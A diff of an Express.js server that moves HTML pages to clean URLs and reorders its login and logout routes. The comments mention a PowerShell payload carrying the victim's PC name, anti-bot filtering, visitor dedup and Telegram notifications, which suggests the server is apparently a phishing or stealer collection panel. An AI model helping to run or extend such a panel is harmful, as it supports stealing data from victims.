@@ -3,7 +3,7 @@
 // Railway Ready — Full Environment Variable Support
 // Fixed: Dedup uses IP + userAgent + screen + nonce + data check
 // Fixed: Handles PowerShell payload with PC name
-// Clean URLs: No .php extension needed
+// Clean URLs: NO .php in address bar — serves directly
 // ============================================================
 
 const express = require('express');
@@ -438,15 +438,15 @@ app.post('/api/login', (req, res) => {
         req.session.lastActivity = Date.now();
         req.session.save();
         log(`[+] User logged in: ${username}`);
-        return res.json({ status: 'ok', message: 'Login successful' });
+        return res.json({ status: 'ok', message: 'Login successful', redirect: '/dashboard' });
     }
 
     log(`[!] Failed login attempt: ${username}`);
     res.status(401).json({ status: 'error', message: 'Invalid username or password' });
 });
 
-// ---- LOGOUT ----
-app.get('/api/logout', (req, res) => {
+// ---- LOGOUT (clean URL) ----
+app.get('/logout', (req, res) => {
     req.session.destroy((err) => {
         if (err) log(`[!] Logout error: ${err.message}`);
         res.clearCookie('connect.sid');
@@ -455,8 +455,8 @@ app.get('/api/logout', (req, res) => {
     });
 });
 
-// ---- LOGOUT (clean URL) ----
-app.get('/logout', (req, res) => {
+// ---- LOGOUT (API fallback) ----
+app.get('/api/logout', (req, res) => {
     req.session.destroy((err) => {
         if (err) log(`[!] Logout error: ${err.message}`);
         res.clearCookie('connect.sid');
@@ -703,7 +703,7 @@ app.post('/api/config/telegram', requireAuth, (req, res) => {
 });
 
 // ============================================================
-// FRONTEND ROUTES — CLEAN URLS (NO .php)
+// FRONTEND ROUTES — CLEAN URLS (NO .php IN ADDRESS BAR)
 // ============================================================
 
 // ---- Public Routes (No Auth Required) ----
@@ -715,29 +715,11 @@ app.get('/', (req, res) => {
 });
 
 app.get('/home', (req, res) => {
-    res.redirect('/home.php');
-});
-
-app.get('/login', (req, res) => {
-    res.redirect('/login.php');
-});
-
-// ---- Protected Routes (Auth Required) ----
-app.get('/dashboard', requireAuth, (req, res) => {
-    res.redirect('/dashboard.php');
-});
-
-app.get('/password-success', requireAuth, (req, res) => {
-    res.redirect('/password-success.php');
-});
-
-// ---- Direct .php files (still work, but redirect to clean URLs) ----
-app.get('/home.php', (req, res) => {
     res.setHeader('Content-Type', 'text/html; charset=utf-8');
     res.sendFile(path.join(__dirname, 'public', 'home.php'));
 });
 
-app.get('/login.php', (req, res) => {
+app.get('/login', (req, res) => {
     if (req.session && req.session.authenticated) {
         return res.redirect('/dashboard');
     }
@@ -745,14 +727,35 @@ app.get('/login.php', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'login.php'));
 });
 
-app.get('/dashboard.php', requireAuth, (req, res) => {
+// ---- Protected Routes (Auth Required) ----
+app.get('/dashboard', requireAuth, (req, res) => {
     res.setHeader('Content-Type', 'text/html; charset=utf-8');
     res.sendFile(path.join(__dirname, 'public', 'dashboard.php'));
 });
 
-app.get('/password-success.php', requireAuth, (req, res) => {
+app.get('/password-success', requireAuth, (req, res) => {
     res.setHeader('Content-Type', 'text/html; charset=utf-8');
     res.sendFile(path.join(__dirname, 'public', 'password-success.php'));
+});
+
+// ---- Fallback .php routes (redirect to clean URLs for backward compatibility) ----
+app.get('/home.php', (req, res) => {
+    res.redirect('/home');
+});
+
+app.get('/login.php', (req, res) => {
+    if (req.session && req.session.authenticated) {
+        return res.redirect('/dashboard');
+    }
+    res.redirect('/login');
+});
+
+app.get('/dashboard.php', requireAuth, (req, res) => {
+    res.redirect('/dashboard');
+});
+
+app.get('/password-success.php', requireAuth, (req, res) => {
+    res.redirect('/password-success');
 });
 
 // ============================================================
@@ -850,7 +853,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`  [+] Dedup: IP + UA + screen + nonce + data check, 5s window`);
     console.log(`  [+] Anti-Bot: ENABLED ✅`);
     console.log(`  [+] Telegram: ${CONFIG.SEND_NOTIFICATIONS ? 'ENABLED ✅' : 'DISABLED ❌'}`);
-    console.log(`  [+] Clean URLs: ENABLED ✅ (no .php needed)`);
+    console.log(`  [+] Clean URLs: ENABLED ✅ (no .php in address bar)`);
     console.log('='.repeat(55) + '\n');
 });
 
